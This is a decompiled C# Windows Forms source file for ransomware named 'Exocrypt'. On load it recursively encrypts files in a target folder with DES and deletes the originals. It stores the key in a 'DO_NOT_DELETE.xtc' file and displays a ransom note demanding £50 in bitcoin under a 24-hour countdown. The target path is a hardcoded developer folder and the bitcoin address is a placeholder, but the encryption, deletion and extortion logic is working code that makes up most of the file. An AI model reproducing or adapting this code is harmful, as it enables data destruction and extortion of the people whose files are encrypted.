using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Exocrypt;

public class Exocrypt0r : Form
{
	public static List<string> files = new List<string>();

	public static string directorytoencrypt = "C:\\Users\\Forged\\Desktop\\Stuff\\C#\\XTC Decrypt0r\\XTC Decrypt0r\\bin\\Debug\\Files to encrypt";

	public static string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!£$%^&*()_+-=#`¬¹\ufffd/.,?><±[]{}";

	private string var = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static string output;

	public static string personal;

	public static string extention;

	public static string key;

	public static string encryption1 = "৮X?8T௧[C";

	public static string XTCipher_Key = "JKLMNOPQRSTUVWXYZ%^&*()_+1234567890-=#`C¬¹\ufffd/⬊⬋⬌⬍⬎⬏⬐⬑⬒⬓৫X৭abcdefghijklmnopqrstuvwxyz৮৯૯௧௫!$TABCDEFGHI";

	public static int counter = 0;

	private string line1 = "All your personal files have been encrypted, your photos, videos";

	public bool line1active = true;

	private string line2 = "and documents are no longer accessible, don't cry yet because I";

	public bool line2active = false;

	private string line3 = "have not deleted them... Yet...";

	public bool line3active = false;

	private string line4 = "In order for me to decrypt your files for you, you must pay a";

	public bool line4active = false;

	private string line5 = "small fee to the following bitcoin address, payment will only be";

	public bool line5active = false;

	private string line6 = "accepted in bitcoin to insure anonymity... Try anything funny and";

	public bool line6active = false;

	private string line7 = "your files will be permanantly encrypted forever.";

	public bool line7active = false;

	private string line8 = "Good luck.";

	public bool line8active = false;

	private IContainer components = null;

	private Label Line1;

	private Timer TextTimer;

	private Label Label2;

	private Label Label3;

	private Label Label4;

	private Label Label5;

	private Label Label6;

	private Label Label7;

	private Label Label8;

	private Label label1;

	private Label label9;

	private Label label10;

	private Label label11;

	private Label label12;

	private Label label15;

	private Label label13;

	private Label label14;

	private TextBox textBox1;

	private Label label16;

	private Button button1;

	private Label label17;

	private Panel Paymentpanel;

	private PictureBox pictureBox1;

	public Exocrypt0r()
	{
		InitializeComponent();
		((Control)Line1).set_Text("");
		((Control)Label2).set_Text("");
		((Control)Label3).set_Text("");
		((Control)Label4).set_Text("");
		((Control)Label5).set_Text("");
		((Control)Label6).set_Text("");
		((Control)Label7).set_Text("");
		((Control)Label8).set_Text("");
	}

	private void TextTimer_Tick(object sender, EventArgs e)
	{
	}

	private void Exocrypt0r_Load(object sender, EventArgs e)
	{
		GenKey();
		extention = "//OLD//";
		personal = encryption1;
		EncryptDir(directorytoencrypt);
		extention = ".xtc";
		personal = key;
		EncryptDir(directorytoencrypt);
	}

	private void TextTimer_Tick_1(object sender, EventArgs e)
	{
		if (line1active)
		{
			if (counter != line1.Length)
			{
				((Control)Line1).set_Text(((Control)Line1).get_Text() + line1[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line1active = false;
				line2active = true;
			}
		}
		else if (line2active)
		{
			if (counter != line2.Length)
			{
				((Control)Label2).set_Text(((Control)Label2).get_Text() + line2[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line2active = false;
				line3active = true;
			}
		}
		else if (line3active)
		{
			if (counter != line3.Length)
			{
				((Control)Label3).set_Text(((Control)Label3).get_Text() + line3[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line3active = false;
				line4active = true;
			}
		}
		else if (line4active)
		{
			if (counter != line4.Length)
			{
				((Control)Label4).set_Text(((Control)Label4).get_Text() + line4[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line4active = false;
				line5active = true;
			}
		}
		else if (line5active)
		{
			if (counter != line5.Length)
			{
				((Control)Label5).set_Text(((Control)Label5).get_Text() + line5[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line5active = false;
				line6active = true;
			}
		}
		else if (line6active)
		{
			if (counter != line6.Length)
			{
				((Control)Label6).set_Text(((Control)Label6).get_Text() + line6[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line6active = false;
				line7active = true;
			}
		}
		else if (line7active)
		{
			if (counter != line7.Length)
			{
				((Control)Label7).set_Text(((Control)Label7).get_Text() + line7[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line7active = false;
				line8active = true;
			}
		}
		else if (line8active)
		{
			if (counter != line8.Length)
			{
				((Control)Label8).set_Text(((Control)Label8).get_Text() + line8[counter]);
				counter++;
			}
			else
			{
				counter = 0;
				line8active = false;
			}
		}
		else
		{
			((Control)Paymentpanel).set_Visible(true);
			TextTimer.set_Enabled(false);
		}
	}

	private static void EncryptDir(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		FileInfo[] array = directoryInfo.GetFiles();
		FileInfo[] array2 = array;
		foreach (FileInfo fileInfo in array2)
		{
			if (fileInfo.Extension.ToLower() != ".exe" && fileInfo.Extension.ToLower() != ".xtc")
			{
				if (extention != "//OLD//")
				{
					EncryptFile(fileInfo.FullName, fileInfo.FullName + extention, personal);
					File.Delete(fileInfo.FullName);
					files.Add(fileInfo.Name);
				}
				else
				{
					int startIndex = fileInfo.FullName.IndexOf(fileInfo.Extension);
					File.Move(fileInfo.FullName, fileInfo.FullName.Remove(startIndex));
					EncryptFile(fileInfo.FullName.Remove(startIndex), fileInfo.FullName, personal);
					File.Delete(fileInfo.FullName.Remove(startIndex));
				}
				Thread.Sleep(1);
			}
		}
		GetSubFoldersEncrypt(d);
	}

	private static void GetSubFoldersEncrypt(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo2 in array)
		{
			EncryptDir(directoryInfo2.FullName);
		}
	}

	private static void GetSubFoldersDecrypt(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo2 in array)
		{
			DecryptDir(directoryInfo2.FullName);
		}
	}

	private static void EncryptFile(string sInputFilename, string sOutputFilename, string sKey)
	{
		FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);
		dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);
		ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
		CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.Close();
		fileStream.Close();
		fileStream2.Close();
	}

	private static void DecryptFile(string sInputFilename, string sOutputFilename, string sKey)
	{
		FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);
		dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);
		ICryptoTransform transform = dESCryptoServiceProvider.CreateDecryptor();
		CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.Close();
		fileStream.Close();
		fileStream2.Close();
	}

	public static void DecryptDir(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		FileInfo[] array = directoryInfo.GetFiles();
		FileInfo[] array2 = array;
		foreach (FileInfo fileInfo in array2)
		{
			if (!(fileInfo.Extension.ToLower() == ".xtc"))
			{
				continue;
			}
			if (extention != "//OLD//")
			{
				int num = fileInfo.FullName.IndexOf(extention);
				if (num != -1)
				{
					DecryptFile(fileInfo.FullName, fileInfo.FullName.Remove(num), personal);
					File.Delete(fileInfo.FullName);
					files.Add(fileInfo.Name + "      [DECRYPTED]");
				}
			}
			else
			{
				_ = fileInfo.Extension;
				int startIndex = fileInfo.FullName.IndexOf(fileInfo.Extension);
				File.Move(fileInfo.FullName, fileInfo.FullName.Remove(startIndex));
				DecryptFile(fileInfo.FullName.Remove(startIndex), fileInfo.FullName, personal);
				File.Delete(fileInfo.FullName.Remove(startIndex));
			}
			Thread.Sleep(5);
		}
		GetSubFoldersDecrypt(d);
	}

	public void StartDecryptionALG()
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		extention = "//OLD//";
		personal = key;
		DecryptDir("C:\\Users\\Forged\\Desktop\\Stuff\\C#\\XTC Decrypt0r\\XTC Decrypt0r\\bin\\Debug\\Files to encrypt");
		extention = ".xtc";
		personal = encryption1;
		DecryptDir("C:\\Users\\Forged\\Desktop\\Stuff\\C#\\XTC Decrypt0r\\XTC Decrypt0r\\bin\\Debug\\Files to encrypt");
		MessageBox.Show("Your files have been decrypted, hope to see you soon ;)");
		File.Delete("DO_NOT_DELETE.xtc");
	}

	public void GenKey()
	{
		if (!File.Exists("DO_NOT_DELETE.xtc"))
		{
			Random random = new Random();
			for (int i = 0; i != 8; i++)
			{
				int index = random.Next(0, characters.Count());
				key += characters[index];
			}
			File.WriteAllText("DO_NOT_DELETE", key);
			string contents = XTCipher_Encrypt("DO_NOT_DELETE");
			File.WriteAllText("DO_NOT_DELETE", contents);
			EncryptFile("DO_NOT_DELETE", "DO_NOT_DELETE.xtc", encryption1);
			File.Delete("DO_NOT_DELETE");
			TextTimer.set_Interval(100);
		}
		else
		{
			DecryptFile("DO_NOT_DELETE.xtc", "DO_NOT_DELETE", encryption1);
			string contents2 = XTCipher_Decrypt("DO_NOT_DELETE");
			File.WriteAllText("DO_NOT_DELETE", contents2);
			key = File.ReadAllText("DO_NOT_DELETE");
			File.Delete("DO_NOT_DELETE");
			TextTimer.set_Interval(1);
		}
	}

	public string XTCipher_Encrypt(string file)
	{
		string text = File.ReadAllText(file);
		for (int i = 0; i != 8; i++)
		{
			for (int j = 0; j != characters.Count(); j++)
			{
				string text2 = characters[j].ToString();
				string text3 = text[i].ToString();
				if (text3 == text2)
				{
					output += text3.Replace(text3[0], XTCipher_Key[j]);
				}
			}
		}
		return output;
	}

	public string XTCipher_Decrypt(string file)
	{
		string text = File.ReadAllText(file);
		for (int i = 0; i != 8; i++)
		{
			for (int j = 0; j != XTCipher_Key.Count(); j++)
			{
				string text2 = XTCipher_Key[j].ToString();
				string text3 = text[i].ToString();
				if (text3 == text2)
				{
					output += text3.Replace(text3[0], characters[j]);
				}
			}
		}
		return output;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		DecryptPass decryptPass = new DecryptPass();
		((Control)decryptPass).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_036c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0376: Expected O, but got Unknown
		//IL_040c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0416: Expected O, but got Unknown
		//IL_04ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b6: Expected O, but got Unknown
		//IL_054c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0556: Expected O, but got Unknown
		//IL_05ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f9: Expected O, but got Unknown
		//IL_094c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0956: Expected O, but got Unknown
		//IL_09e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ea: Expected O, but got Unknown
		//IL_0aec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af6: Expected O, but got Unknown
		//IL_0ccd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd7: Expected O, but got Unknown
		//IL_0ce8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf2: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Exocrypt0r));
		Line1 = new Label();
		TextTimer = new Timer(components);
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		Label6 = new Label();
		Label7 = new Label();
		Label8 = new Label();
		label1 = new Label();
		label9 = new Label();
		label10 = new Label();
		label11 = new Label();
		label12 = new Label();
		label15 = new Label();
		label13 = new Label();
		label14 = new Label();
		textBox1 = new TextBox();
		label16 = new Label();
		button1 = new Button();
		label17 = new Label();
		Paymentpanel = new Panel();
		pictureBox1 = new PictureBox();
		((Control)Paymentpanel).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Line1).set_AutoSize(true);
		((Control)Line1).set_BackColor(Color.Transparent);
		((Control)Line1).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Line1).set_ForeColor(Color.Red);
		((Control)Line1).set_Location(new Point(12, 9));
		((Control)Line1).set_Name("Line1");
		((Control)Line1).set_Size(new Size(306, 19));
		((Control)Line1).set_TabIndex(0);
		((Control)Line1).set_Text("============= Line ============= ");
		TextTimer.set_Enabled(true);
		TextTimer.add_Tick((EventHandler)TextTimer_Tick_1);
		((Control)Label2).set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.Red);
		((Control)Label2).set_Location(new Point(12, 28));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(306, 19));
		((Control)Label2).set_TabIndex(1);
		((Control)Label2).set_Text("============= Line ============= ");
		((Control)Label3).set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.Red);
		((Control)Label3).set_Location(new Point(12, 47));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(306, 19));
		((Control)Label3).set_TabIndex(2);
		((Control)Label3).set_Text("============= Line ============= ");
		((Control)Label4).set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.Red);
		((Control)Label4).set_Location(new Point(12, 76));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(306, 19));
		((Control)Label4).set_TabIndex(3);
		((Control)Label4).set_Text("============= Line ============= ");
		((Control)Label5).set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Red);
		((Control)Label5).set_Location(new Point(12, 95));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(306, 19));
		((Control)Label5).set_TabIndex(4);
		((Control)Label5).set_Text("============= Line ============= ");
		((Control)Label6).set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.Red);
		((Control)Label6).set_Location(new Point(12, 114));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(306, 19));
		((Control)Label6).set_TabIndex(5);
		((Control)Label6).set_Text("============= Line ============= ");
		((Control)Label7).set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Transparent);
		((Control)Label7).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.Red);
		((Control)Label7).set_Location(new Point(12, 133));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(306, 19));
		((Control)Label7).set_TabIndex(6);
		((Control)Label7).set_Text("============= Line ============= ");
		((Control)Label8).set_AutoSize(true);
		((Control)Label8).set_BackColor(Color.Transparent);
		((Control)Label8).set_Font(new Font("Consolas", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.Red);
		((Control)Label8).set_Location(new Point(12, 162));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(306, 19));
		((Control)Label8).set_TabIndex(7);
		((Control)Label8).set_Text("============= Line ============= ");
		((Control)label1).set_BackColor(Color.Red);
		((Control)label1).set_Location(new Point(16, 22));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(175, 3));
		((Control)label1).set_TabIndex(8);
		((Control)label9).set_BackColor(Color.Red);
		((Control)label9).set_Location(new Point(16, 94));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(175, 3));
		((Control)label9).set_TabIndex(9);
		((Control)label10).set_BackColor(Color.Red);
		((Control)label10).set_Location(new Point(16, 22));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(3, 75));
		((Control)label10).set_TabIndex(10);
		((Control)label11).set_BackColor(Color.Red);
		((Control)label11).set_Location(new Point(188, 22));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(3, 75));
		((Control)label11).set_TabIndex(11);
		((Control)label12).set_BackColor(Color.Red);
		((Control)label12).set_Location(new Point(585, 34));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(3, 50));
		((Control)label12).set_TabIndex(15);
		((Control)label15).set_BackColor(Color.Red);
		((Control)label15).set_Location(new Point(208, 34));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(380, 3));
		((Control)label15).set_TabIndex(12);
		((Control)label13).set_BackColor(Color.Red);
		((Control)label13).set_Location(new Point(208, 34));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(3, 50));
		((Control)label13).set_TabIndex(16);
		((Control)label14).set_BackColor(Color.Red);
		((Control)label14).set_Location(new Point(208, 81));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(380, 3));
		((Control)label14).set_TabIndex(17);
		((Control)textBox1).set_BackColor(Color.White);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Font(new Font("Consolas", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.Blue);
		((Control)textBox1).set_Location(new Point(298, 49));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(195, 20));
		((Control)textBox1).set_TabIndex(18);
		((Control)textBox1).set_Text("BTC Address here");
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_Font(new Font("Consolas", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label16).set_ForeColor(Color.White);
		((Control)label16).set_Location(new Point(217, 51));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(77, 15));
		((Control)label16).set_TabIndex(19);
		((Control)label16).set_Text("£50 in BTC");
		((Control)button1).set_Location(new Point(499, 47));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(20);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label17).set_AutoSize(true);
		((Control)label17).set_Font(new Font("Consolas", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label17).set_ForeColor(Color.White);
		((Control)label17).set_Location(new Point(33, 42));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(143, 34));
		((Control)label17).set_TabIndex(21);
		((Control)label17).set_Text("24:00:00");
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label17);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)button1);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label16);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)textBox1);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label14);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label13);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label12);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label15);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label11);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label10);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label9);
		((Control)Paymentpanel).get_Controls().Add((Control)(object)label1);
		((Control)Paymentpanel).set_Location(new Point(7, 203));
		((Control)Paymentpanel).set_Name("Paymentpanel");
		((Control)Paymentpanel).set_Size(new Size(611, 110));
		((Control)Paymentpanel).set_TabIndex(22);
		((Control)Paymentpanel).set_Visible(false);
		pictureBox1.set_ErrorImage((Image)componentResourceManager.GetObject("pictureBox1.ErrorImage"));
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(-3, -3));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(634, 325));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(23);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImageLayout((ImageLayout)2);
		((Form)this).set_ClientSize(new Size(624, 321));
		((Control)this).get_Controls().Add((Control)(object)Paymentpanel);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Line1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Exocrypt0r");
		((Control)this).set_Text("Exocrypt");
		((Form)this).add_Load((EventHandler)Exocrypt0r_Load);
		((Control)Paymentpanel).ResumeLayout(false);
		((Control)Paymentpanel).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
